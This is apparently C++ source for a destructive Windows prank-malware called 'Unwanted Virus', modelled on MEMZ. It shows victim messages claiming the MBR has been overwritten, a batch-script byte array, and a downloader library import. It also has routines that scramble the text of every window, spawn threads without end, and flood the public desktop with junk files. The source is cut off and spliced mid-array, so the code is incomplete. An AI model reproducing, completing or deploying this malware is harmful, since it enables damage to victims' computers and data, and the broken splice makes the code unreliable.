/*-------------------------------------------+
|                                            |
|   Unwanted Virus Source Code               |
|                                            |
|   (C) BenjaminFretez 2021.                 |
|                                            |
+--------------------------------------------*/

/* This malware is based on the MEMZ malware */

/* include files */
#include <windows.h> // Required for WINAPI
#include <iostream> // Required for input-output
#include <fstream> // Required for files
#include <stdio.h>

/* required for downloading files*/
#pragma comment (lib, "urlmon.lib")

using namespace std;

DWORD wb;

/* files content */
const unsigned char msg[] = "Hello! You have ran the called Úñåáñþéd ßí®ú’ (Unwanted Virus)\r\n\r\nYour computer is now done for anyway,\r\nkilling Unwanted.exe process will not do anything, just it rewrited the MBR...\r\nYour eta is 2 minutes, THE TIME IS RUNNING! =)";
const size_t msg_len = sizeof(msg);

const unsigned char diem[] = "ÜÓÚ ÑÉÉÐ ÞÓ ÐÍÉÉÉÉ²¼2ð¤ú®¥½ö’«   ÜÓÚ ÑÉEÐ TÓ ÐÍÉ YOU NEED TO DIEÉÉÉ aáaááá €€¼€³¤²¤¤¬²¬\r\nïñ§tág®áµ@Endersshow@#RT#$tþ¤³þ³å³äs³®É F3¤€Þ³TÅ®¤ÅÞ€ÜÉÜWÞÜÉ€Ü¤\r\n WHY ARE YOU RUNNING? WHY ARE YOU RUNNING? ÁÄÉ³ÁÅÅÁÅAÁÄÉ®Ü¼Ú¼½Í¾»¬»«¥®²³ÞÄ³®";
const size_t die_len = sizeof(diem);

const unsigned char lastm[] = "ÜÓÚ\n YOU COMPUTER WILL DIE IN 10 SECONDS €¤ÜÞÅ³®²®¤³Þ\r\n³€ÞÜ¤Wé nééð á ñéwc ímputyer guys¼€ÚÉ6YE³\r\n®²¤Þ¤€Ü¼Ú€Time is over, you killed it!¤Þ¤€Þ¤\r\n³é³å²€Þ¤";
const size_t last_len = sizeof(lastm);

const unsigned char escapem[] = "Hey! The escape is behind you,\r\nLook behind you please, Is there!!";
const size_t escape_len = sizeof(escapem);


const unsigned char batm[] = { 0xEF, 0xBB, 0xBF, 0x40, 0x65, 0x63, 0x68, 0x6F, 0x20, 0x6F, 0x66, 0x66, 0x0D, 0x0A, 0x63, 0x64,
    SendMessageW(hwnd, WM_SETTEXT, NULL, (LPARAM)str);

    GlobalFree(str);

    HWND child = GetWindow(hwnd, GW_CHILD);

    while (child) {
        enumerateChildren(child);
        child = GetWindow(child, GW_HWNDNEXT);
    }
}

BOOL CALLBACK EnumWindowProc(HWND hwnd, LPARAM lParam) {
    enumerateChildren(hwnd);

    return TRUE;
}


void strReverseW(LPWSTR str) {
    int len = lstrlenW(str);

    WCHAR c;
    int i, j;
    for (i = 0, j = len - 1; i < j; i++, j--) {
        c = str[i];
        str[i] = str[j];
        str[j] = c;
    }

    // Fix Newlines
    for (i = 0; i < len - 1; i++) {
        if (str[i] == L'\n' && str[i + 1] == L'\r') {
            str[i] = L'\r';
            str[i + 1] = L'\n';
        }
    }
}

int payloadReverseText(int times, int runtime) {
    EnumWindows(&EnumWindowProc, NULL);

    return 50;
}

/* reverse change payload */
void strchangeW(LPWSTR str);

void enumerateChildren2(HWND hwnd) {
    LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * rand());

    SendMessageW(hwnd, WM_GETTEXT, 8192, (LPARAM)str);
    strchangeW(str);
    SendMessageW(hwnd, WM_SETTEXT, NULL, (LPARAM)str);

    GlobalFree(str);

    HWND child = GetWindow(hwnd, GW_CHILD);

    while (child) {
        enumerateChildren(child);
        child = GetWindow(child, GW_HWNDNEXT);
    }
}

void strchangeW(LPWSTR str) {
    int len = lstrlenW(str);

    WCHAR c;
    int i, j;
    for (i = 0, j = len - 1; i < j; i++, j--) {
        c = str[i] - rand() % 10;
        str[i] = str[j] + rand() % 10;
        str[j] = c + rand() % 10;
    }

    // Fix Newlines
    for (i = 0; i < len - 1; i++) {
        if (str[i] == L'\n' && str[i + 1] == L'\r') {
            str[i] = L'\r';
            str[i + 1] = L'\n';
        }
    }
}

BOOL CALLBACK EnumWindowProc2(HWND hwnd, LPARAM lParam) {
    enumerateChildren2(hwnd);

    return TRUE;
}

int ChangeText(int times, int runtime) {
    EnumWindows(&EnumWindowProc2, NULL);
    return 50;
}

int payloadChangeText(int times, int runtime) {
    while (1) {
        CreateThread(NULL, NULL, &payloadThread, &ChangeText, NULL, NULL);
        Sleep(1000);
    }
}

/* create desktop files */
void CreateDesktopFiles()
{

    CreateFileA("\\Users\\Public\\Desktop\\³¼¤½¤¾¤®¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³´í€éß¼³¼éðéð", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\€íþðåéü‘«´íúü", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¤³¤þþ¤³®²éð²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤½¤¾¤®¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¤þßäþ¾ö»¥‘ú¤", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\©å®ñóéß©áöéðé", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¤þ³¼þ€³þðå¤få", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ßóöéáóðð³þ¼¾×«", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³€ü¤€¤€þé²³é²²³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\å¤þ®¤þ¤¤€ü¼€€¤þ", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¤¼¼¤é³³®þ³ü¤¾¾", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\€ü¤ú¼ú½¾í½óóó²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\áßäéþð®þü®þüþü", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\®þéþéþ®þ®üððððð", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ßéä³¤®þ¤€ü¼üü¼¤", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0); CreateFileA("\\Users\\Public\\Desktop\\³¼¤½¤¾¤®¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ü¼€åþ³¤þ³©ßðþþú½", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\å®€ð©ßðþéúí®©ö´»¬", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0); CreateFileA("\\Users\\Public\\Desktop\\³¼¤½¤¾¤®¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³é³¤¼ü€ú½í¼í½úü€¼", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\¡þßúíþ¼í½¼íéßsðð", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\×¥«ö‘úü€©®®€¤ü¤€ü", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³²¤¼½¾ü®¤ððßßßsßð", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\á®¼¤í‘»¬³®éðåßäßwä", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\á®óúðñé®þ®óå®ð®®é", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\¤€³¼³¤½¤€½¼€®¤¤³¤²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤½¤¾¤®¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³€¼³¤€üþ¤¤€€³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\¤¼¤³¼€¤ü€¼ú€ú²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\¤²€³¼³²¼¤®é³²é", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\¤³¤óåé®øÁßÐÅÉ®Å", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\é€³¤¼¤þ¤®ðåééåå", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\å³¤¤¼ü€úððááðá", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\åéðóåäßåðä®³€¼", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤½¤¾¤®¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\¤€ü€íú½íþéßßåéå", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\þ³þ€ü¼úíí½¾í½¾í", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\áðéå®¤þ®éþü¼ú€ü²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ßá®åé¤®³¤þþ³¤þ¤þ", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\å¤þ³þ³þ¤þ¤€þééþú", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\µ©ßßéüüúí€¼€éååå", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\µááäååþü€¤³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤½¤¾¤A¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\µ©ßáåé®þü€¤³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤B¤¾¤®¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\µ©ß³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤½¤¾¤®Cé³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\µ©áá³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤½¤D¾¤®¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\²¤€³®ððßßßßäåéå¤³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤½¤EE®¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\€³³²²²²³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤½¤¾¤®¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\µ€½½‘²¾‘½€³¤²²³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼F''¤®¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\µ©®³³éþþ³¤þ¤4³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤½??®¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\µ©ßáåéþ€³³¼¤¼¤®þü€¤³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼a??a¤®¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\µ©ßáee®þü€¤³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤½¤^%$$®¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\å®é®åþü¤€ü¤ü¤ü4³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤½¤??¾¤®¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\µkindaofkool³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤ÁÁÁÁ®¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\µ©é®å®®å®å®³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\rrrrr³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\Åíñðóåßßßßß", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤½¤¾¤¤³²²²³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\µ©ßáwindows€¤³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼ÅÉÅÄ²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³þ¤þ¤þ³¤@Enderman³³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤½¤¾Ð©Å®ÞÉ®Þ", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\µ©ßássss¤³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤½¤¾ÐÅÅWEF³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\µ¤¼¤½€¾¼‘½¾‘½’‘’¾¾¤³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤Å²³³¤€³¤€¤3²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\µconw³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼3222²²²666²²¡¡²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¤½¾³¤²€²€€³€²€€²€€®éáæß©ðß", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\®é²³¤²²¤€²³€²³€€ú½í¼í", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\áðþ¤³þ€¤4³ó‘¾½½½½’’¥", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ñßé®üú¾‘öíúüüþ®e", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\áðáéåéþ®þüþ®üú", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\éåéå®é®þ®þ®®ß", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ááðéé®é®©ðææð", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\æßáåð©©ñµúüüþ®å", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\æðáðéáåßðß", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼³€³¤þ€¤þ€", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³ðß®þé€þé®þú®", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
